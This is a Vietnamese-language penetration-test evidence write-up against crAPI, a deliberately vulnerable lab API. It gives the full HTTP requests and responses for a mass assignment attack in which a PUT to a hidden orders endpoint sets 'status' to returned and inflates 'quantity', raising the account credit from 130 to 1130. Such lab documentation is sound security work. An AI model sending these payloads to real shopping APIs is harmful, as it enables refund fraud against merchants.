# Bằng chứng — Vector B: shadow API `PUT /workshop/api/shop/orders/{id}`

Môi trường: crAPI 1.1.5 (commit `700f03d`). Token JWT và email đã được che.

Endpoint này **không có trên giao diện web** và schema OpenAPI chỉ khai báo `product_id`,
`quantity`; tuy nhiên server vẫn chấp nhận thuộc tính `status` từ client.

## 1. Tạo đơn mới (1 sản phẩm, đã trả 10.0)

```http
POST /workshop/api/shop/orders HTTP/1.1
Authorization: Bearer <JWT redacted>
Content-Type: application/json

{"product_id":1,"quantity":1}
```

```http
HTTP/1.1 200 OK

{"id":8,"message":"Order sent successfully.","credit":130.0}
```

## 2. Gửi request mass assignment

```http
PUT /workshop/api/shop/orders/8 HTTP/1.1
Authorization: Bearer <JWT redacted>
Content-Type: application/json

{"product_id":1,"quantity":100,"status":"returned"}
```

```http
HTTP/1.1 200 OK

{"orders":{"id":8,"product":{"id":1,"name":"Seat","price":"10.00"},
 "quantity":100,"status":"returned","transaction_id":"<redacted>"}}
```

## 3. Kiểm tra số dư

```http
GET /workshop/api/shop/products?offset=0&limit=10 HTTP/1.1
Authorization: Bearer <JWT redacted>
```

```http
HTTP/1.1 200 OK

{"products":[...],"credit":1130.0}
```

## Trước / sau

| Thời điểm | Credit |
|---|---|
| Trước PUT | `130.0` |
| Sau PUT | `1130.0` |

Client đổi `quantity` từ 1 thành 100 **và** đặt `status=returned` dù chưa hoàn hàng.
Server dùng chính `quantity` do client gửi để tính hoàn tiền `100 × $10`, nên số dư tăng
`1000.0`. Đây là cả mass assignment thuộc tính server-owned (`status`, `quantity`) lẫn
thiếu kiểm tra nghiệp vụ của workflow refund.
